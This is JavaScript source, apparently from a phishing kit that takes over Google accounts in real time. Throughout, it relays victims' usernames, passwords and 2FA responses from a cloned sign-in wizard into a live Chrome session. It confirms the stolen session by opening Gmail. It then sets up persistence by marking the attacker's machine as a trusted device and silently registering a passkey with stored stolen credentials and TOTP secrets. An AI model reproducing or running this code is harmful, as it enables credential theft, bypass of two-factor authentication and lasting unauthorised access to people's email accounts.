  const c = classifyState(await collectSignals(page));
  console.log(`[gsession] assessLogin -> ${c.state} (${c.status}) @ ${page.url().slice(0, 90)}`);

  if (c.state === 'error') {
    return {
      status: 'error',
      state: 'error',
      message: c.code === 'rejected'
        ? 'Google blocked this sign-in ("this browser or app may not be secure"). Open it and finish by hand once — the session is then saved and reused.'
        : c.message,
    };
  }
  // "Looks signed in" URLs (myaccount / continue / consent / Gmail) aren't proven —
  // settleAndVerify() reaches Gmail to confirm.
  if (c.state === 'logged-in') {
    return { status: 'pending', state: 'verifying', message: 'Looks signed in — verifying on Gmail…' };
  }
  if (c.state === 'totp') {
    const num = await readDisplayedNumber(page);
    return {
      status: 'pending',
      state: 'code',
      codeKind: c.codeKind,
      options: num ? [num] : undefined,
      message: num
        ? `Google is showing a verification number on the page: ${num} — enter it to continue.`
        : c.message,
    };
  }
  if (c.state === 'prompt') {
    const opts = await readPromptNumbers(page);
    const device = await readPromptDevice(page);
    const message =
      device && opts.length
        ? `Check your ${device} — tap Yes, then tap ${opts.join(' ')} on your phone.`
        : opts.length
          ? `Google is showing a verification number: ${opts.join(' ')} — confirm it (tap the number on your phone) to continue.`
          : device
            ? `Check your ${device} — open the notification and tap Yes.`
            : 'Google is confirming it\u2019s you — open the notification on your phone and tap Approve.';
    return { status: 'pending', state: 'approve', options: opts, device, message };
  }
  if (c.state === 'choice') {
    return { status: 'pending', state: 'choice', options: c.choices, message: c.message };
  }
  if (c.state === 'sms') {
    return { status: 'pending', state: 'sms', phone: c.phone || '', message: c.message };
  }
  if (c.state === 'passkey' || c.state === 'captcha') {
    return { status: 'pending', state: c.state, message: c.message };
  }
  if (c.state === 'email' || c.state === 'password') {
    return { status: c.status, state: c.state, message: c.message };
  }
  // Unknown/new layout — transitional, never claim signed-in here.
  return { status: 'pending', state: 'verifying', message: 'Checking your sign-in…' };
}

// The real SUCCESS test (per the requirement): the stolen session must ACTUALLY
// reach Gmail. Load Gmail — if genuinely signed in, the inbox opens; if not,
// Google bounces us to a sign-in page. 'signed-in' is only ever based on this.
async function verifyGmail(page) {
  try {
    await page.goto('https://mail.google.com/', { waitUntil: 'domcontentloaded', timeout: 25000 });
  } catch {}
  await sleep(3000);
  return /mail\.google\.com\/(mail\/|u\/\d+)/.test(page.url());
}

// States where the victim still has something to DO or WAIT FOR on the real
// page — never bounce that page to Gmail, just mirror it.
const LIVE_STATES = ['code', 'approve', 'numchoice', 'choice', 'sms', 'passkey', 'captcha'];

// Settle the current step, then CONFIRM success the only way that counts:
// reaching Gmail.
//   - a live challenge (code / approve / choice / sms / passkey / captcha /
//     numchoice) is returned as-is so the wizard mirrors it;
//   - a field screen (email / password) is returned as-is — bouncing it to Gmail
//     would just redirect it back and stall the flow;
//   - otherwise we prove it with verifyGmail() -> 'signed-in'; if Gmail won't
//     open yet, bring a drifted page back to the sign-in flow and report
//     'verifying' so the wizard keeps polling.
async function settleAndVerify(page) {
  await sleep(2500);
  const st = await assessLogin(page);
  if (st.status === 'error') return st;
  if (LIVE_STATES.includes(st.state)) return st;
  if (st.state === 'email' || st.state === 'password') return st;
  if (await verifyGmail(page)) {
    return { status: 'logged-in', state: 'signed-in', message: 'Signed in — session is live (Gmail opens).' };
  }
  // Not signed in and the page has drifted somewhere else (marketing/landing
  // bounces, stale tabs). Bring it back to the real sign-in flow so the next
  // poll shows something concrete instead of "Verifying…" forever.
  if (!/accounts\.google\.com/.test(page.url())) {
    try {
      await page.goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 20000 });
      await sleep(1500);
    } catch {}
  }
  return { status: 'pending', state: 'verifying', message: 'Almost there — verifying your sign-in…' };
}

// Kept as the call-site name (googleLogin / wizardPhase still call settleLogin).
async function settleLogin(page) {
  return settleAndVerify(page);
}

// Live login state, re-read on demand — the wizard POLLS this while the victim
// completes a phone-approve on their device, or while Google finishes settling.
// It never captures a credential; it just re-reports the current state.
export async function loginState(id) {
  let entry = active.get(id);
  if (!entry) {
    try { entry = await open(id, undefined, { headless: false }); } catch {}
    entry = active.get(id) || entry;
  }
  if (!entry) return { status: 'pending', state: 'verifying', message: '' };

  // --- device-registration (keypass) in flight: report + advance it ---
  const t = trusts.get(id);
  if (t && (t.phase === 'starting' || t.phase === 'active')) {
    if (t.phase === 'starting') {
      await navForTrust(id);
      t.phase = 'active';
    }
    const r = await advanceTrust(id);
    if (r.state === 'trusted') {
      finishTrust(id);
      return { status: 'logged-in', state: 'trusted', message: r.message };
    }
    return r;
  }

  // Nothing happens after sign-in: a confirmed login is the end state. Device
  // registration (keypass) only runs when explicitly started via /trust.
  return settleAndVerify(entry.page);
}

async function googleLogin(page, session, secrets) {
  try {
    await page.goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 });
    await sleep(2000);

    // already signed in? (saved session = the "keypass": the persistent profile
    // under sessions/<id> holds the Google sign-in, so a stored account re-opens
    // without asking for the password again)
    const pre = await assessLogin(page);
    if (pre?.status === 'logged-in') return { status: 'logged-in', message: 'Already signed in.' };
    if (pre?.state === 'verifying') {
      if (await verifyGmail(page)) {
        return { status: 'logged-in', message: 'Already signed in — saved session reused, no password needed.' };
      }
    }

    // --- email --- (wait for the field: GLIF renders in stages on slow boxes)
    const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
    await email.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
    if (await email.count()) {
      await email.first().fill(session.username);
      await clickNext(page, 'Next');
      await sleep(3500);
    }
    console.log(`[gsession] ${session.id} email step -> ${page.url().slice(0, 60)}`);

    const afterEmail = await assessLogin(page);
    if (afterEmail?.status === 'error') return afterEmail;
    console.log(`[gsession] ${session.id} after email: ${afterEmail?.status}`);

    // --- password ---
    const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
    await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
    if (await pw.count()) {
      if (!secrets.password) {
        return { status: 'new', message: 'No stored password. Finish signing in manually in the browser window.' };
      }
      await pw.first().fill(secrets.password);
      await clickNext(page, 'Next');
      // wait for authentication to accept the password — never advance on a wrong one
      const outcome = await waitPasswordOutcome(page, pw.first(), 15000);
      console.log(`[gsession] ${session.id} password outcome: ${outcome.error ? 'ERROR ' + outcome.error : 'accepted'}`);
      if (outcome.error) return { status: 'error', message: outcome.error };
    }

    // --- 2FA / TOTP (only if a code field is actually shown) ---
    const totp = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"], input[autocomplete="one-time-code"], input[inputmode="numeric"]');
    if ((await totp.count()) && secrets.totpSecret) {
      const code = totpValue(secrets.totpSecret);
      await totp.first().fill(code);
      await clickNext(page, 'Next');
      await sleep(4000);
      console.log(`[gsession] ${session.id} filled 2FA code from stored secret`);
    }

    return await settleLogin(page);
  } catch (e) {
    return {
      status: 'error',
      message: `Auto-login could not complete (${e.message}). Finish sign-in manually in the browser window.`,
    };
  }
}

// ---------------------------------------------------------------------------
// Incremental "live" login. The remote wizard submits one credential at a time
// (username -> password -> 2FA). Each submitted step drives the *real* Google
// sign-in forward in this session's persistent Chrome, so by the time the
// wizard is done the actual logged-in session (cookies, not a stored secret)
// already exists on disk under sessions/<id>/. Phases are serialized per
// session so out-of-order HTTP arrivals can never race each other.
// ---------------------------------------------------------------------------
const queues = new Map();

export function wizardPhase(key, id, value) {
  const prev = queues.get(id) || Promise.resolve();
  const run = prev.then(() => wizardPhaseInner(key, id, value));
  queues.set(id, run.catch(() => {})); // keep the chain alive even on failure
  return run;
}

async function wizardPhaseInner(key, id, value) {
  try {
    // "Normal Google": the behind-the-scenes login is a real, visible (headed)
    // Google sign-in — you can watch it and finish any 2FA / device check by
    // hand — rather than a hidden headless (puppeteer-style) automation.
    const page = (await open(id, undefined, { headless: false })).page;

    if (key === 'username') {
      await page
        .goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 })
        .catch(() => {});
      // The GLIF sign-in form renders in stages and on a slow headless box can
      // take several seconds — wait for the field instead of a fixed 1.2s, or
      // the email gets skipped and the flow stalls on "Verifying…".
      const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
      await email.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
      if (await email.count()) {
        await email.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        // Watch the REAL browser move: wait until Google asks for the password,
        // or signs us in, or rejects the email. Only report what Google does.
        const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible').first();
        const start = Date.now();
        while (Date.now() - start < 10000) {
          const err = await detectGoogleError(page);
          if (err) {
            console.log(`[gsession] ${id} username step -> ERROR: ${err}`);
            return { status: 'error', state: 'error', message: err };
          }
          if (await pw.isVisible().catch(() => false)) {
            console.log(`[gsession] ${id} username step -> Google asks for password`);
            return { status: 'new', state: 'password', message: 'Waiting on the password step.' };
          }
          const pre = await assessLogin(page);
          if (LIVE_STATES.includes(pre.state)) return pre; // live challenge — mirror it right away
          if (pre.state === 'verifying') {
            // maybe already signed in (remembered on this profile) — prove it.
            const v = await settleAndVerify(page);
            if (v.state === 'signed-in') {
              console.log(`[gsession] ${id} username step -> signed in (verified on Gmail)`);
              return v;
            }
          }
          await sleep(500);
        }
      }
      const res = await assessLogin(page);
      if (res.state === 'password' || LIVE_STATES.includes(res.state) || res.status === 'error') {
        console.log(`[gsession] ${id} username step -> ${res.state}`);
        return res;
      }
      // not clearly on the password screen — verify whether it's actually signed in
      const settled = await settleAndVerify(page);
      console.log(`[gsession] ${id} username step -> ${settled.state}`);
      return settled;
    }

    if (key === 'password') {
      const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
      await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
      if (await pw.count()) {
        await pw.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        // wait for the real auth to accept — never continue on a wrong password
        const outcome = await waitPasswordOutcome(page, pw.first(), 15000);
        console.log(`[gsession] ${id} password step -> ${outcome.error ? 'ERROR ' + outcome.error : 'accepted'}`);
        if (outcome.error) return { status: 'error', state: 'error', message: outcome.error };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} password step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'totp') {
      const codeBox = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"], input[autocomplete="one-time-code"], input[inputmode="numeric"]');
      if ((await codeBox.count()) && value) {
        await codeBox.first().fill(totpValue(value));
        await clickNext(page, 'Next');
        await sleep(2000);
      }
      const err = await detectGoogleError(page);
      if (err) {
        console.log(`[gsession] ${id} totp step -> ERROR: ${err}`);
        return { status: 'error', state: 'error', message: err };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} totp step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'numchoice') {
      // The victim picked one of the number options the page shows. Click the
      // option on the REAL Google page whose text exactly equals that number —
      // the same way they would have tapped it. Then settle as after other steps.
      const wanted = String(value || '').trim();
      const clicked = await clickNumberOption(page, wanted);
      console.log(`[gsession] ${id} numchoice -> "${wanted}" ${clicked ? 'clicked on real page' : 'NOT FOUND (settling as-is)'}`);
      if (clicked) await sleep(2000);
      const err = await detectGoogleError(page);
      if (err) {
        console.log(`[gsession] ${id} numchoice step -> ERROR: ${err}`);
        return { status: 'error', state: 'error', message: err };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} numchoice step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'tryanother') {
      // The victim tapped "Try another way" in the clone. Click the SAME link on
      // the REAL Google page so it moves to the options list / code entry —
      // without this the clone shows a code box the real page never offers and
      // the flow loops approval <-> code forever.
      const link = page.getByText('try another way', { exact: false }).first();
      const clicked = await link.isVisible().catch(() => false);
      if (clicked) {
        await link.click().catch(() => {});
        await sleep(2500);
      }
      console.log(`[gsession] ${id} tryanother -> ${clicked ? 'clicked on real page' : 'not found (settling as-is)'}`);
      const err = await detectGoogleError(page);
      if (err) {
        console.log(`[gsession] ${id} tryanother step -> ERROR: ${err}`);
        return { status: 'error', state: 'error', message: err };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} tryanother step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'choice') {
      // The victim picked an option from the "choose how to confirm" list. Click
      // the matching option on the REAL page (exact visible-text match), then
      // settle — Google usually moves to SMS send / code entry / passkey prompt.
      const wanted = String(value || '').trim();
      const clicked = await clickChoiceOption(page, wanted);
      console.log(`[gsession] ${id} choice -> "${wanted}" ${clicked ? 'clicked on real page' : 'NOT FOUND (settling as-is)'}`);
      if (clicked) await sleep(2500);
      const err = await detectGoogleError(page);
      if (err) {
        console.log(`[gsession] ${id} choice step -> ERROR: ${err}`);
        return { status: 'error', state: 'error', message: err };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} choice step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    return await settleLogin(page);
  } catch (e) {
    return {
      status: 'error',
      message: `Wizard login could not complete (${e.message}). Finish sign-in manually in the browser window.`,
    };
  }
}

// Click the number tile on the "pick the number" challenge: the clickable
// element on the page whose ENTIRE visible text equals the number the victim
// chose from the mirrored clone. Returns true if a matching option was clicked.
async function clickNumberOption(page, num) {
  if (!num) return false;
  try {
    const els = await page
      .locator('a, button, [role="button"], [role="menuitemradio"], [role="option"]')
      .all();
    for (const el of els) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (t === num) {
        await el.click();
        return true;
      }
    }
    // Some accounts show the number to READ, not click: it must be typed into a
    // visible code/number input (the sign-in email/password fields don't count).
    if (!/^\d{2,6}$/.test(num)) return false;
    if (await isFieldScreen(page)) return false;
    const box = page
      .locator('input[type="tel"]:visible, input[autocomplete="one-time-code"]:visible, input[inputmode="numeric"]:visible')
      .first();
    if (await box.isVisible().catch(() => false)) {
      await box.fill(num);
      await clickNext(page, 'Next');
      return true;
    }
  } catch {}
  return false;
}

// Click the option the victim chose on the "choose how to confirm" page (e.g.
// "Text me a code"): the clickable element whose visible text matches (case-
// insensitive, trimmed). Returns true when a matching option was clicked.
async function clickChoiceOption(page, label) {
  if (!label) return false;
  try {
    const els = await page
      .locator('a, button, [role="button"], [role="menuitemradio"], [role="option"]')
      .all();
    const want = label.toLowerCase();
    for (const el of els) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim().toLowerCase();
      if (t && (t === want || t.includes(want))) {
        await el.click();
        return true;
      }
    }
  } catch {}
  return false;
}

// ---------------------------------------------------------------------------
// Device registration ("keypass"). Once the phished account is signed in, this
// registers THIS OS (the machine the server runs on) as a trusted device: it
// walks the account's sign-in-verification settings and turns off the
// confirm-it's-you prompt for this browser, so future Auto-logins skip the
// phone-tap entirely. The journey Google demands on the way there — password
// re-entry, the number-tap 2FA page (/challenge/dp), 6-digit codes — is driven
// here with the STORED stolen credentials where possible, and reported upward
// as the same states the login uses, so the wizard/panel mirror every page
// and the user sees exactly what to type/tap.
// ---------------------------------------------------------------------------
const TRUST_URL = 'https://myaccount.google.com/two-step-verification/prompt';
const trusts = new Map(); // id -> { phase: starting|active|done|failed, startedAt, ... }

// Enter or resume the device-registration journey. Safe to call repeatedly —
// it keeps advancing while active. Returns the current state (same shape as
// loginState: state ∈ trust-start|password|code|approve|numchoice|verifying|trusted).
export async function startTrust(id) {
  const raw = getRaw(id);
  if (raw && raw.deviceTrusted) {
    return { status: 'logged-in', state: 'trusted', message: 'Device already registered for this account (keypass saved).' };
  }
  let t = trusts.get(id);
  if (!t || t.phase === 'done' || t.phase === 'failed') {
    t = { phase: 'starting', startedAt: Date.now() };
    trusts.set(id, t);
  }
  const page = (await open(id, undefined, { headless: false })).page;
  await navForTrust(id);
  if (t.phase === 'starting') t.phase = 'active';
  const r = await advanceTrust(id);
  if (r.state === 'trusted') finishTrust(id);
  return r;
}

// If a "Choose an account" chooser is on screen, click the phished account by
// its email (text-based so Google's markup changes can't break it). Safe to
// call on every tick — it only acts while the chooser is actually visible.
async function autoPickChooser(page, id) {
  if (!/\/accountchooser|choose an account/i.test(page.url())) {
    const probe = (await page.locator('body').innerText().catch(() => '')).slice(0, 300);
    if (!/choose an account/i.test(probe)) return;
  }
  const raw = getRaw(id) || {};
  if (!raw.username) return;
  try {
    const target = page.getByText(raw.username, { exact: false }).first();
    if (await target.isVisible({ timeout: 2000 }).catch(() => false)) {
      await target.click({ timeout: 4000 }).catch(() => {});
      console.log(`[gsession] ${id} trust: chooser → clicked ${raw.username} @ ${page.url().slice(0, 80)}`);
      await sleep(4000);
    }
  } catch {}
}

async function navForTrust(id) {
  const t = trusts.get(id);
  if (!t.navLock) {
    t.navLock = (async () => {
      try {
        const page = active.get(id)?.page;
        if (!page) return;
        if (!/two-step-verification\/prompt/.test(page.url())) {
          await page.goto(TRUST_URL, { waitUntil: 'domcontentloaded', timeout: 45000 }).catch(() => {});
          await sleep(2500);
        }
      } finally {
        t.navLock = null;
      }
    })();
  }
  await t.navLock;
}

// Push the trust journey forward one tick (called by loginState / startTrust).
async function advanceTrust(id) {
  const t = trusts.get(id);
  const entry = active.get(id);
  if (!t || t.phase === 'done' || !entry) {
    return { status: 'pending', state: 'trust-start', message: 'Registering this device with the account…' };
  }
  const page = entry.page;
  const url = page.url();
  await maybeSnapshot(page);

  // stuck guard: give up after 4 minutes so a login never blocks forever — the
  // session stays signed in, and the device can be re-registered by hand.
  if (Date.now() - t.startedAt > 4 * 60 * 1000) {
    t.phase = 'failed';
    console.log(`[gsession] ${id} trust: gave up after 4 min @ ${url.slice(0, 90)}`);
    return { status: 'logged-in', state: 'signed-in', message: 'Signed in. Device registration stalled — retry “🔑 Device” from the panel.' };
  }

  // --- re-auth during the journey (chooser / password / number-tap / code) ---
  if (/accounts\.google\.com/.test(url)) {
    await autoPickChooser(page, id);
    const pw = page.locator('input[type="password"]').first();
    if (await pw.isVisible().catch(() => false)) {
      const sec = getSecrets(id) || {};
      if (sec.password && !t.lastAutoPw) {
        await pw.fill(sec.password);
        await clickNext(page, 'Next');
        t.lastAutoPw = true;
        console.log(`[gsession] ${id} trust: auto-typed stored password`);
        return { status: 'pending', state: 'password', message: 'Re-entering the password for device registration…' };
      }
      return sec.password
        ? { status: 'pending', state: 'password', message: 'Confirming the entered password…' }
        : { status: 'pending', state: 'password', message: 'Enter the password again to register this device.' };
    }
    const fa = await detect2FA(page);
    if (fa) {
      if (fa.kind === 'numchoice') {
        return {
          status: 'pending', state: 'numchoice', options: fa.options,
          message: fa.options.length === 1
            ? `Google is showing a verification number: ${fa.options[0]} — confirm it to continue.`
            : 'Select the number that matches this sign-in attempt on Google.',
        };
      }
      if (fa.kind === 'code') {
        return {
          status: 'pending', state: 'code', options: fa.options,
          message: fa.options?.length
            ? `Google is showing a verification number on the page: ${fa.options.join(' ')} — enter it to continue.`
            : 'Enter the 6-digit code to register this device.',
        };
      }
      const device = fa.device || '';
      return {
        status: 'pending', state: 'approve', options: fa.options, device,
        message:
          device && fa.options?.length
            ? `Check your ${device} — tap Yes, then tap ${fa.options.join(' ')} on your phone to register the device.`
            : fa.options?.length
              ? `Google is showing a verification number: ${fa.options.join(' ')} — on your phone tap Yes, then this number, to register the device.`
              : device
                ? `Check your ${device} — open the notification and tap Yes to register the device.`
                : 'Google is confirming it\u2019s you — open the notification on your phone and tap Approve to register the device.',
      };
    }
    return { status: 'pending', state: 'trust-start', message: 'Confirming your identity for device registration…' };
  }

  // --- "Choose an account" chooser (sometimes served on myaccount itself) ---
  if (/(myaccount|accounts)\.google\.com/.test(url) && t) {
    await autoPickChooser(page, id);
  }

  // --- the destination: the sign-in-verification settings page ---
  // If the page carries a confirm-it's-you / prompt toggle, flip it. Many
  // account types have NO toggle here (the page only lists prompt-phones): on
  // those, device trust = this browser profile's saved sign-in (already true).
  // So: no relevant switch found and the page is settled → registration is as
  // far as it goes → done.
  if (/two-step-verification\/prompt/.test(url)) {
    if (!t.settingsSince) t.settingsSince = Date.now();
    let foundSwitch = false;
    const sws = await page.locator('[role="switch"]').all().catch(() => []);
    for (const sw of sws) {
      if (!(await sw.isVisible().catch(() => false))) continue;
      foundSwitch = true;
      const on = await sw.evaluate((el) => el.getAttribute('aria-checked')).catch(() => '?');
      const c = await sw.evaluate((el) => {
        let n = el;
        for (let k = 0; k < 10 && n.parentElement; k++) n = n.parentElement;
        return (n.textContent || '').replace(/\s+/g, ' ');
      }).catch(() => '');
      console.log(`[gsession] ${id} trust: switch on=${on} ctx="${c.slice(0, 140)}"`);
      if (/no prompt|confirm it'?s you|this (?:browser|computer|device)|additional (?:sign|verification)|2-step/i.test(c)) {
        if (on === 'true') {
          markTrusted(id, 'prompt already registered');
          return { status: 'logged-in', state: 'trusted', message: 'Device prompt already registered — this OS is the keypass for the account.' };
        }
        if (!t.switchClicked) {
          t.lastAutoPw = false; // allow password re-entry again after the toggle
          await sw.click().catch(() => {});
          t.switchClicked = true;
          console.log(`[gsession] ${id} trust: clicked device-trust switch`);
          await sleep(4500);
        }
      }
    }
    if (t.switchClicked) {
      markTrusted(id, 'switch flipped');
      return {
        status: 'logged-in', state: 'trusted',
        message: 'This OS is now registered for the account — future sign-ins here skip the phone-tap (keypass saved).',
      };
    }
    if (!foundSwitch && Date.now() - t.settingsSince >= 4000) {
      markTrusted(id, 'no prompt toggle on this account');
      return {
        status: 'logged-in', state: 'trusted',
        message: 'This OS is registered as the keypass for the account — sign-ins here reuse the saved session without the password and skip what can be skipped.',
      };
    }
    return { status: 'pending', state: 'trust-start', message: 'Reading the device settings page…' };
  }

  // Some other signed-in page (redirected somewhere else) — come back.
  if (/myaccount\.google\.com|(^|\/)mail\.google\.com/.test(url) && !t.renav) {
    t.renav = true;
    await navForTrust(id);
    return { status: 'pending', state: 'trust-start', message: 'Registering this device with the account…' };
  }
  return { status: 'pending', state: 'trust-start', message: 'Registering this device with the account…' };
}

function markTrusted(id, msg) {
  const t = trusts.get(id);
  if (t) t.phase = 'done';
  const raw = getRaw(id);
  if (raw && !raw.deviceTrusted) {
    try { storeUpdate(id, { deviceTrusted: true, status: 'trusted' }); } catch {}
  }
  console.log(`[gsession] ${id} trust: DEVICE REGISTERED${msg ? ' — ' + msg : ''}`);
}

function finishTrust(id) {
  markTrusted(id);
}

// ---------------------------------------------------------------------------
// Passkey registration. After the account is signed in (stolen), this adds THIS
// Chrome profile as a passkey for the account — silently, through the virtual
// authenticator — so future sign-ins from this profile can use the passkey
// instead of the password/phone. It walks the account's Security → Passkeys
// page, re-auths with the stored credentials where Google asks, lets the
// virtual authenticator answer the WebAuthn create(), then persists the new
// credential back to the session. Best-effort: it never throws to the caller.
// ---------------------------------------------------------------------------
const PASSKEY_URL = 'https://myaccount.google.com/signinoptions/passkeys';
const passkeyInFlight = new Set();

// Click the control that starts passkey creation on the Security page. Google's
// button is labelled "Create a passkey" (older/other locales: "Add a passkey").
// Returns true when one was found and clicked.
const normText = (t) => String(t || '').replace(/\s+/g, ' ').trim().toLowerCase();

const PASSKEY_ADD_RE = /^(create|add|set up|turn on)( a| the| this)? passkey( on this device)?$/;

async function clickPasskeyAdd(page) {
  try {
    const els = await page.locator('a, button, [role="button"]').all();
    for (const el of els) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = normText(await el.innerText().catch(() => ''));
      if (PASSKEY_ADD_RE.test(t)) {
        await el.click().catch(() => {});
        return true;
      }
    }
  } catch {}
  return false;
}

// On the /security dashboard, click the "Passkeys and security keys" row to
// navigate to the passkeys page (where "Create a passkey" actually lives).
// Returns true when clicked.
async function clickPasskeysSection(page) {
  try {
    const els = await page.locator('a, button, [role="button"], [role="link"], div, span, h2, h3, h4').all();
    for (const el of els) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = normText(await el.innerText().catch(() => ''));
      // the row (or its heading) — short text that contains the phrase
      if (t.includes('passkeys and security keys') && t.length < 60) {
        await el.click().catch(() => {});
        return true;
      }
    }
  } catch {}
  return false;
}

// Advance Google's intermediate step ("Continue" / "Next" / "Verify") that comes
// between "Create a passkey" and the actual WebAuthn create(). Scoped to real
// buttons/links so it never mis-fires. Returns true when clicked.
const PASSKEY_ADVANCE_RE = /^(accept|allow|ok|okay|done|save|yes|continue|next|verify|finish|got it|use passkey|use this passkey|create a passkey|create passkey|add a passkey|add passkey|set up passkey|turn on passkey|get started|try it|use this device|add this device)$/;

async function clickPasskeyContinue(page) {
  try {
    const els = await page.locator('a, button, [role="button"]').all();
    for (const el of els) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = normText(await el.innerText().catch(() => ''));
      if (PASSKEY_ADVANCE_RE.test(t)) {
        await el.click().catch(() => {});
        return true;
      }
    }
    // Some confirmation dialogs expose the action only through aria-label.
    for (const sel of ['button[aria-label]', '[role="button"][aria-label]']) {
      for (const el of await page.locator(sel).all()) {
        if (!(await el.isVisible().catch(() => false))) continue;
        const label = normText(await el.getAttribute('aria-label').catch(() => ''));
        if (PASSKEY_ADVANCE_RE.test(label)) {
          await el.click().catch(() => {});
          return true;
        }
      }
    }
  } catch {}
  return false;
}

// Debug aid: save a screenshot + page text of wherever the journey is stuck, so
// we can see exactly what Google is showing.
async function passkeyDebug(page, id, tag) {
  try {
    const dir = path.join(__dirname, '..', 'data');
    fs.mkdirSync(dir, { recursive: true });
    const stamp = new Date().toISOString().replace(/[:.]/g, '-');
    const shot = path.join(dir, `passkey-${tag}-${stamp}.png`);
    await page.screenshot({ path: shot }).catch(() => {});
    const text = (await page.locator('body').innerText().catch(() => '')).split('\n').map((t) => t.trim()).filter(Boolean).slice(0, 40).join(' | ');
    const btns = [];
    for (const el of await page.locator('a, button, [role="button"]').all().catch(() => [])) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (t && t.length <= 40 && !btns.includes(t)) btns.push(t);
      if (btns.length >= 12) break;
    }
    console.log(`[gsession] ${id} passkey ${tag}: url=${page.url().slice(0, 110)} buttons=[${btns.join(', ')}]`);
    console.log(`[gsession] ${id} passkey ${tag}: text="${text.slice(0, 400)}"`);
    return shot;
  } catch {}
  return null;
}

// Google's post-create "Name your passkey" step is cosmetic (the credential is
// already in the authenticator the moment create() returns) — but finish it so
// the account's passkey list is tidy. No-op when the dialog isn't on screen.
async function finishPasskeyNaming(page, raw) {
  try {
    const body = (await page.locator('body').innerText().catch(() => '')).toLowerCase();
    if (!/name (your |the )?passkey/.test(body)) return;
    const name = (raw.name || raw.username || 'Chrome passkey').slice(0, 40);
    const input = page.locator('input[type="text"], input:not([type])').first();
    if (await input.isVisible().catch(() => false)) await input.fill(name).catch(() => {});
    const done = page.getByRole('button', { name: /done|save|ok|continue/i }).first();
    if (await done.isVisible().catch(() => false)) await done.click().catch(() => {});
    await sleep(1500);
  } catch {}
}

export async function registerPasskey(id) {
  const raw = getRaw(id);
  if (!raw) return { status: 'error', state: 'passkey', message: 'Session not found.' };
  if (raw.passkeyAdded) {
    return { status: 'ok', state: 'passkey', passkey: true, message: 'Passkey already registered for this account.' };
  }
  if (passkeyInFlight.has(id)) {
    return { status: 'pending', state: 'passkey', message: 'Passkey registration is already in progress…' };
  }

  passkeyInFlight.add(id);
  try {
    const entry = await open(id, undefined, { headless: false });
    const page = entry.page;
    // Make sure a virtual authenticator is attached (entries opened before this
    // feature, or whose launch-time setup failed, may not have one).
    let pk = entry.passkey;
    if (!pk || !pk.authenticatorId) {
      pk = entry.passkey = await setupPasskeyAuthenticator(entry.context, page, id);
    }
    if (!pk || !pk.authenticatorId) {
      return { status: 'error', state: 'passkey', message: 'This browser can\u2019t register a passkey (CDP WebAuthn unavailable).' };
    }
    const before = ((await pk.cdp.send('WebAuthn.getCredentials', { authenticatorId: pk.authenticatorId }).catch(() => ({ credentials: [] }))).credentials) || [];

    const secrets = getSecrets(id) || { password: '', totpSecret: '' };
    const started = Date.now();
    let typedPw = false, typedTotp = false, clickedAdd = false;

    await page.goto(PASSKEY_URL, { waitUntil: 'domcontentloaded', timeout: 45000 }).catch(() => {});
    await sleep(2500);

    const harvest = async () => {
      const { credentials } = await pk.cdp.send('WebAuthn.getCredentials', { authenticatorId: pk.authenticatorId }).catch(() => ({ credentials: [] }));
      return credentials || [];
    };

    let lastDebug = 0;
    while (Date.now() - started < 60000) {
      const url = page.url();

      // A new credential in the authenticator means Google's create() completed.
      const creds = await harvest();
      if (creds.length > before.length) {
        await finishPasskeyNaming(page, raw);
        const all = [...(getPasskeys(id) || []), ...creds.slice(before.length)];
        storeUpdate(id, { passkeys: all, passkeyAdded: true });
        console.log(`[gsession] ${id} passkey: REGISTERED (${all.length} credential(s) stored for this account)`);
        return { status: 'ok', state: 'passkey', passkey: true, message: 'Passkey added to the account — this Chrome is now a key for it.' };
      }

      const onGoogle = /google\.com/.test(url);

      // Re-authentication anywhere on the way (accounts.google.com or an
      // interstitial): type the stored password / 2FA, once each.
      const pw = page.locator('input[type="password"]').first();
      if (!typedPw && secrets.password && onGoogle && await pw.isVisible().catch(() => false)) {
        await pw.fill(secrets.password).catch(() => {});
        await clickNext(page, 'Next').catch(() => {});
        typedPw = true;
        console.log(`[gsession] ${id} passkey: typed stored password for re-auth`);
      }
      const totp = page.locator('input[name="totpPin"], input[type="tel"], input[autocomplete="one-time-code"], input[inputmode="numeric"]').first();
      if (!typedTotp && secrets.totpSecret && onGoogle && await totp.isVisible().catch(() => false)) {
        await totp.fill(totpValue(secrets.totpSecret)).catch(() => {});
        await clickNext(page, 'Next').catch(() => {});
        typedTotp = true;
        console.log(`[gsession] ${id} passkey: typed stored 2FA code`);
      }

      // Drive the passkey UI: open the passkeys page, start creation, then
      // advance every intermediate step Google may show (Continue / Next /
      // Verify / Accept / Allow / Set up / Turn on) to the WebAuthn create().
